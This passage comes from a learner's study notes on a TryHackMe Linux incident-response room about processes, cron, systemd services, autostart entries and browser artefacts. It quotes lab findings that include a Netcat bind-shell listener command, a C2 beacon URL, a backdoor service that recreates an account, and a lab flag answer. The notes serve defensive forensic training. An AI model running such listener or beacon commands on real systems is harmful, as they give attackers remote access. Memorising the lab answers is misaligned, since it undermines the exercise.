- I practised using `ps`, `lsof`, `pstree` and `top` to examine processes from different perspectives.
- I understood why a process's full command line, parent process, open files and network sockets are important during forensic analysis.
- I identified how a Netcat listener, interactive shell and named pipe can be associated with a bind shell.
- I learned how process ancestry can reveal that suspicious activity was launched by cron.
- I understood how cron syntax works and how system-level and user-level cronjobs differ.
- I learned to inspect cron configuration files, scheduled-task directories, user crontabs and cron execution logs.
- I learned that Pspy can help identify short-lived processes and executions that may not be visible in a manual process snapshot.
- I understood how a malicious systemd service can repeatedly recreate an unauthorised account.
- I learned to examine service status, unit files, `ExecStart`, service processes and journal logs.
- I learned how `.desktop` autostart entries can be abused to execute commands at user login.
- I understood why private SSH keys, shell histories, profiles and MOTD-related scripts are useful forensic artefacts.
- I learned how `.viminfo` and browser profiles can help reconstruct user activity.
- I practised the purpose of Dumpzilla and the types of browser artefacts it can extract.
- I understood that no single artefact is enough: process, persistence, filesystem, application and log evidence should be correlated to build a reliable incident timeline.

---

# 10. Self-Assessment Questions

Try answering these without looking back at the notes.

1. What is a Linux process?
2. What is the difference between PID and PPID?
3. What does `ps -eFH` show?
4. Why is `ps -u <username>` useful during an investigation?
5. What does `lsof` help an investigator discover?
6. What do the `-p` and `-s` options do in `pstree`?
7. What is a bind shell?
8. What does the `p` file-type character indicate in `ls -l` output?
9. What evidence can show that Netcat is listening on a TCP port?
10. How can a process tree reveal that cron launched a suspicious script?
11. How is `top` different from `ps`?
12. What is a cronjob?
13. What are the five time fields in a cron expression?
14. How does `/etc/crontab` differ from a user's crontab?
15. Why is a root cronjob executing a file in a writable directory dangerous?
16. Where are system cron schedules stored?
17. Where are user crontabs commonly stored on the system described in the lesson?
18. How can cron logs help identify when a user modified a crontab?
19. What is Pspy useful for?
20. What is a Linux service?
21. What does `systemctl enable` do?
22. Which systemd unit-file directive identifies the command to execute?
23. Why should an investigator inspect both the service unit file and its executable?
24. What is the purpose of `journalctl -u`?
25. How do autostart scripts differ from cronjobs and services?
26. What is the purpose of a `.desktop` file in an autostart directory?
27. Why is an autostart command that uploads a private SSH key suspicious?
28. What information may be present in `.bash_history` and `.viminfo`?
29. Where does Firefox store its user profile data in the example?
30. What kinds of browser artefacts can Dumpzilla extract?
31. Why should cookies be treated as sensitive evidence?
32. Why is it important to correlate process, service, cron and application artefacts?

---

# 11. Practical Completion Checklist

- [ ] Connected to the TryHackMe Linux workstation.
- [ ] Reviewed the investigation setup and trusted binary paths.
- [ ] Enumerated processes with `ps`.
- [ ] Filtered processes by user.
- [ ] Reviewed process ancestry with `pstree`.
- [ ] Inspected process files and sockets with `lsof`.
- [ ] Monitored live processes with `top`.
- [ ] Inspected the suspicious process script and named pipe.
- [ ] Reviewed system-wide cron configuration.
- [ ] Enumerated hourly, daily, weekly, monthly and custom cron entries.
- [ ] Reviewed user-level crontabs.
- [ ] Checked cron execution logs.
- [ ] Used Pspy to observe process executions.
- [ ] Enumerated running systemd services.
- [ ] Inspected the suspicious service status and unit file.
- [ ] Reviewed the service executable and journal logs.
- [ ] Enumerated system and user autostart entries.
- [ ] Inspected user configuration and SSH-related artefacts.
- [ ] Enumerated installed packages.
- [ ] Located and reviewed `.viminfo` files.
- [ ] Located browser profile directories.
- [ ] Identified the relevant Firefox profile.
- [ ] Used Dumpzilla to review browser artefacts.
- [ ] Correlated findings into an investigation timeline.
- [ ] Recorded missing answers from my own lab output.

---

# 12. Lab Answers and Evidence Record

This section records only answers that were explicitly present in the supplied lesson material. Replace placeholders with findings from my own run when available.

## Cronjobs

| Question | Answer |
|---|---|
| Full URL of the C2 server in the system-level cronjob | `http://c2.intelligent-software.thm:8310/beacon` |
| Hidden flag in a user-level cron script | `THM{4682786cf2d92f01c4d30a2bbf4621f7}` |
| Decoded flag echoed every 15 seconds in Pspy output | **[Not included in supplied text]** |

## Autostart scripts

| Question | Answer |
|---|---|
| Full URL that receives Janice's private SSH key | **[Redacted in supplied text]** |
| Command run by the “Show Network Interfaces” entry | **[Not included in supplied text]** |

## Process investigation notes

**Suspicious script path:**

```text
/home/janice/abzkd83o4jakxld.sh
```

**Listener command observed:**

```text
nc -l 0.0.0.0 4444
```

**Named pipe observed:**

```text
/tmp/f
```

**Parent process chain in the supplied example:**

```text
systemd → cron → CRON → sh → abzkd83o4jakxld.sh → cat / nc / sh
```

## Service investigation notes

**Suspicious service:**

```text
b4ckd00rftw.service
```

**Unit file:**

```text
/etc/systemd/system/b4ckd00rftw.service
```

**Executable:**

```text
/usr/local/bin/b4ckd00rftw.sh
```

**Account created by the script:**

```text
b4ckd00rftw
```

## Application artefact notes

**Vim artefact locations found in the lesson:**

```text
/home/janice/.viminfo
/home/ubuntu/.viminfo
```

**Firefox profile analysed:**

```text
/home/eduardo/.mozilla/firefox/niijyovp.default-release
```

**Dumpzilla summary from the supplied lesson:**

- Bookmarks: 10
- Cookies: 34
- Download history: 1
- Search engines: 6
- History entries: 14
- Public Key Pinning entries: 9
- Permissions: 4
- Preferences: 162

---

## 13. References

- TryHackMe — [Linux Process Analysis](https://tryhackme.com/)
- TryHackMe — [Linux File System Analysis](https://tryhackme.com/room/linuxfilesystemanalysis)
- TryHackMe — Linux Fundamentals Part 3 (cronjob refresher referenced by the lesson)
- Linux manual pages: `ps`, `lsof`, `pstree`, `top`, `systemctl`, `journalctl`, `cron` and `dpkg`
- Dumpzilla — [Kali tool information](https://www.kali.org/tools/dumpzilla/)

---

**Status:** Notes prepared from the supplied TryHackMe lesson material. The decoded Pspy flag, the complete URL in Janice's autostart file and the Show Network Interfaces command were not present in the supplied text and remain to be filled from the lab.
